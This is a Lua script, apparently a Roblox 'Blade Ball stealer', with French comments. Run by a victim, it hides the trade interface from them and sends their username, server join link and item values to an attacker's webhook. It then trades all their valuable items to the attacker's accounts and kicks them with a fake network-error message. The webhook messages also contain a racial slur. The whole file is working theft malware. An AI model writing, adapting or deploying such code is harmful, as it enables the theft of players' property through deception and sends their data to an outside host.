_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false
local notificationsGui = PlayerGui.Notifications
local tradeCompleteGui = PlayerGui.TradeCompleted
local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

local users = _G.Usernames or {}
local min_rap = _G.min_rap or 100
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""
local auth_token = _G.AuthToken or "" 

-- Vérifications de sécurité de base
if next(users) == nil or webhook == "" then
    plr:kick("Configuration manquante (Usernames/Webhook)")
    return
end

if game.PlaceId ~= 13772394625 then
    plr:kick("Seulement sur les serveurs normaux")
    return
end

-- Vérification du code PIN (Reset bypass)
local args = {
    [1] = {
        ["option"] = "PIN",
        ["value"] = "9079"
    }
}
local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args))
if PINReponse ~= "You don't have a PIN code" then
    plr:kick("Désactive ton code PIN de trade")
    return
end

-- Masquage de l'interface de trade pour la victime
tradeGui.Black.Visible = false
tradeGui.MiscChat.Visible = false
tradeCompleteGui.Black.Visible = false
tradeCompleteGui.Main.Visible = false
local maintradegui = tradeGui.Main
maintradegui.Visible = false
maintradegui:GetPropertyChangedSignal("Visible"):Connect(function() maintradegui.Visible = false end)

-- Fonction de formatage (1880 -> 1.88k)
local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    if suffixIndex == 1 then
        return tostring(math.floor(number))
    else
        return string.format("%.2f%s", number, suffixes[suffixIndex])
    end
end

local totalRAP = 0

-- FONCTION : Message d'annonce (Join Link) avec TRI RAP
local function SendJoinMessage(list, prefix)
    local fields = {
        { name = "Victim Username 🤖:", value = plr.Name, inline = true },
        { name = "Join link 🔗:", value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId },
        { name = "Item list 📝:", value = "", inline = false },
        { name = "Summary 💰:", value = "", inline = false }
    }

    local grouped = {}
    for _, item in ipairs(list) do
        if grouped[item.Name] then
            grouped[item.Name].Count = grouped[item.Name].Count + 1
            grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
        else
            grouped[item.Name] = { Name = item.Name, Count = 1, TotalRAP = item.RAP }
        end
    end

    local groupedList = {}
    for _, group in pairs(grouped) do table.insert(groupedList, group) end

    -- TRI DU PLUS GROS RAP AU PLUS PETIT
    table.sort(groupedList, function(a, b) return a.TotalRAP > b.TotalRAP end)

    for _, group in ipairs(groupedList) do
        local itemLine = string.format("⭐ %s (x%s) - %s RAP", group.Name, group.Count, formatNumber(group.TotalRAP))
        fields[3].value = fields[3].value .. itemLine .. "\n"
    end
    
    fields[4].value = string.format("Total RAP: %s", formatNumber(totalRAP))

    local data = {
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
        ["auth_token"] = auth_token, 
        ["embeds"] = {{
            ["title"] = "🟣 Bro join your hit nigga 🎯",
            ["color"] = 8323327,
            ["fields"] = fields,
            ["footer"] = { ["text"] = "Blade Ball stealer by Eblack" }
        }}
    }
    
    local success, res = pcall(function()
        return HttpService:PostAsync(webhook, HttpService:JSONEncode(data))
    end)
end

-- FONCTION : Message final (Items envoyés) avec TRI RAP
local function SendMessage(list)
    local fields = {
        { name = "Victim Username 🤖:", value = plr.Name, inline = true },
        { name = "Items sent 📝:", value = "", inline = false },
        { name = "Summary 💰:", value = "", inline = false }
    }

    local grouped = {}
    for _, item in ipairs(list) do
        if grouped[item.Name] then
            grouped[item.Name].Count = grouped[item.Name].Count + 1
            grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
        else
            grouped[item.Name] = { Name = item.Name, Count = 1, TotalRAP = item.RAP }
        end
    end

    local groupedList = {}
    for _, group in pairs(grouped) do table.insert(groupedList, group) end

    -- TRI DU PLUS GROS RAP AU PLUS PETIT
    table.sort(groupedList, function(a, b) return a.TotalRAP > b.TotalRAP end)

    for _, group in ipairs(groupedList) do
        local itemLine = string.format("✅ %s (x%s) - %s RAP", group.Name, group.Count, formatNumber(group.TotalRAP))
        fields[2].value = fields[2].value .. itemLine .. "\n"
    end
    
    fields[3].value = string.format("Total RAP: %s", formatNumber(totalRAP))

    local data = {
        ["auth_token"] = auth_token,
        ["embeds"] = {{
            ["title"] = "🟣 The nigga is on the server 🎉",
            ["color"] = 8323327,
            ["fields"] = fields,
            ["footer"] = { ["text"] = "Blade Ball stealer by Eblack" }
        }}
    }

    pcall(function()
        HttpService:PostAsync(webhook, HttpService:JSONEncode(data))
    end)
end

-- Logique de récupération du RAP et de l'inventaire
local rapDataResult = Replion.Client:GetReplion("ItemRAP")
local rapData = rapDataResult.Data.Items

local function buildNameToRAPMap(category)
    local nameToRAP = {}
    local categoryRapData = rapData[category]
    if not categoryRapData then return nameToRAP end

    for serializedKey, rap in pairs(categoryRapData) do
        local success, decodedKey = pcall(function() return HttpService:JSONDecode(serializedKey) end)
        if success and type(decodedKey) == "table" then
            for _, pair in ipairs(decodedKey) do
                if pair[1] == "Name" then
                    nameToRAP[pair[2]] = rap
                    break
                end
            end
        end
    end
    return nameToRAP
end

local rapMappings = {}
for _, category in ipairs(categories) do rapMappings[category] = buildNameToRAPMap(category) end

for _, category in ipairs(categories) do
    for itemId, itemInfo in pairs(clientInventory[category]) do
        if itemInfo.TradeLock then continue end
        local rap = (rapMappings[category] and rapMappings[category][itemInfo.Name]) or 0
        if rap >= min_rap then
            totalRAP = totalRAP + rap
            table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = category, Name = itemInfo.Name})
        end
    end
end

-- Lancement du vol et des trades
if #itemsToSend > 0 then
    -- Tri initial pour le trade
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)

    local sentItems = {}
    for i, v in ipairs(itemsToSend) do sentItems[i] = v end

    local prefix = (ping == "Yes") and "--[[@everyone]] " or ""
    SendJoinMessage(itemsToSend, prefix)

    local function doTrade(joinedUser)
        while #itemsToSend > 0 do
            -- Send Trade Request
            pcall(function() netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(game.Players:WaitForChild(joinedUser)) end)
            repeat task.wait(0.5) until tradeGui.Enabled

            -- Ajout des items (max 100 par trade)
            local count = 0
            while #itemsToSend > 0 and count < 100 do
                local item = table.remove(itemsToSend, 1)
                pcall(function() netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID) end)
                count = count + 1
            end

            -- Ready et Confirm
            pcall(function() netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true) end)
            pcall(function() netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer() end)
            repeat task.wait(0.1) until not tradeGui.Enabled
        end
        plr:kick("Please check your internet connection (Error Code: 277)")
    end

    -- Attendre qu'un de tes comptes (users) rejoigne
    local function checkAndTrade()
        for _, p in ipairs(Players:GetPlayers()) do
            if table.find(users, p.Name) then
                SendMessage(sentItems)
                doTrade(p.Name)
                break
            end
        end
    end

    checkAndTrade()
    Players.PlayerAdded:Connect(function(p)
        if table.find(users, p.Name) then
            SendMessage(sentItems)
            doTrade(p.Name)
        end
    end)
end
